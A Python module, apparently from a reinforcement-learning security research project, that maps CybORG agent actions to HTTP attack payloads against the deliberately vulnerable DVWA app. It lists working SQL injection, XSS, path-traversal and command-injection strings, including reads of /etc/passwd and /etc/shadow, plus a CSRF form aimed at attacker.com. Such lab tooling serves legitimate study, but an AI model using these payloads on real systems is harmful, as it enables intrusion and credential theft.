"""
Action Mapper: Translates CybORG RL actions into concrete DVWA payloads.
"""
import random
from cyborg_integration import (
    DVWAExploitAction, 
    DVWAPatchAction, 
    DVWAScanAction,
    DVWAPortScanAction,
    DVWADirectoryDiscoveryAction,
    DVWAFuzzAction,
    DVWASmartExploitAction
)

class ActionMapper:
    """Maps abstract CybORG actions to real-world HTTP payloads for DVWA"""
    
    def __init__(self):
        # Dictionary of payloads for different attack types
        self.payloads = {
            'sqli': [
                "' OR '1'='1",
                "' UNION SELECT 1,2,3--",
                "admin' --",
                "' OR 1=1#"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert('XSS')"
            ],
            'lfi': [
                "../../../../etc/passwd",
                "/etc/passwd",
                "....//....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php"
            ],
            'rce': [
                "; cat /etc/passwd",
                "| whoami",
                "`id`",
                "$(cat /etc/shadow)"
            ],
            'csrf': [
                "<form action='http://attacker.com'>",
                # CSRF usually requires hosting a page, but for DVWA we act as the visitor
                "GET /csrf/change_password" 
            ]
        }
        
    def map_action(self, action, state=None):
        """
        Convert a CybORG action object into a descriptive dict 
        that the DVWA Controller can execute.
        """
        if isinstance(action, DVWAExploitAction):
            return self._map_exploit(action, state)
        elif isinstance(action, DVWASmartExploitAction):
            return self._map_smart_exploit(action)
        elif isinstance(action, DVWAPatchAction):
            return self._map_patch(action, state)
        elif isinstance(action, DVWAScanAction):
            return self._map_scan(action)
        elif isinstance(action, (DVWAPortScanAction, DVWADirectoryDiscoveryAction)):
            return {
                "type": "recon",
                "location": "network",
                "description": f"Executing recon action: {action.__class__.__name__}"
            }
        elif isinstance(action, DVWAFuzzAction):
            return {
                "type": "scan",
                "location": action.location,
                "fuzz_type": action.fuzz_type,
                "description": f"Fuzzing {action.location} for {action.fuzz_type} signatures"
            }
        else:
            return {
                "type": "unknown",
                "description": f"Unknown action: {action}"
            }

    def _map_exploit(self, action, state):
        """Map exploit action to concrete payload"""
        vuln_id = action.vuln_id
        
        # Look up vulnerability details if state is provided
        vuln_type = "unknown"
        location = "unknown"
        
        if state and hasattr(state, 'active_vulns'):
            vuln = state.active_vulns.get(vuln_id)
            if vuln:
                vuln_type = vuln.get('type', 'unknown').lower()
                location = vuln.get('location', 'unknown')
        
        # Normalize type key
        type_key = 'sqli' # Default
        if 'sql' in vuln_type: type_key = 'sqli'
        elif 'xss' in vuln_type: type_key = 'xss'
        elif 'lfi' in vuln_type: type_key = 'lfi'
        elif 'rce' in vuln_type: type_key = 'rce'
        elif 'csrf' in vuln_type: type_key = 'csrf'
        
        # Select a payload
        payload = random.choice(self.payloads.get(type_key, ["TEST_PAYLOAD"]))
        
        return {
            "type": "exploit",
            "action_object": action, # Keep reference if needed
            "vuln_id": vuln_id,
            "attack_type": type_key,
            "location": location,
            "payload": payload,
            "description": f"Exploiting {vuln_id} ({vuln_type}) on {location} with {payload}"
        }

    def _map_patch(self, action, state=None):
        """Map patch action"""
        vuln_id = action.vuln_id
        location = "unknown"
        vuln_type = "unknown"
        
        # Look up vulnerability details if state is provided
        if state and hasattr(state, 'active_vulns'):
            vuln = state.active_vulns.get(vuln_id)
            if vuln:
                location = vuln.get('location', 'unknown')
                vuln_type = vuln.get('type', 'unknown')
        
        return {
            "type": "patch",
            "vuln_id": vuln_id,
            "location": location,
            "description": f"Patching {vuln_type} vulnerability {vuln_id} at {location}"
        }

    def _map_scan(self, action):
        """Map scan action"""
        loc = action.location if action.location else "entire application"
        return {
            "type": "scan",
            "location": action.location,
            "description": f"Scanning {loc} for vulnerabilities"
        }

    def _map_smart_exploit(self, action):
        """
        PROFESSIONAL BRIDGE: 
        This is where the RL decision is sent to the LLM.
        """
        attack_type = action.attack_type.lower()
        location = action.location
        
        # Select a payload (In the future, this calls YOUR trained LLM)
        # For now, we use the catalog as a placeholder for the "Perfect LLM"
        payload = random.choice(self.payloads.get(attack_type, ["' OR 1=1 --"]))
        
        return {
            "type": "exploit",
            "attack_type": attack_type,
            "location": location,
            "payload": payload,
            "is_llm_generated": True,
            "description": f"Targeting {location} with {attack_type.upper()} using LLM Payload: {payload}"
        }

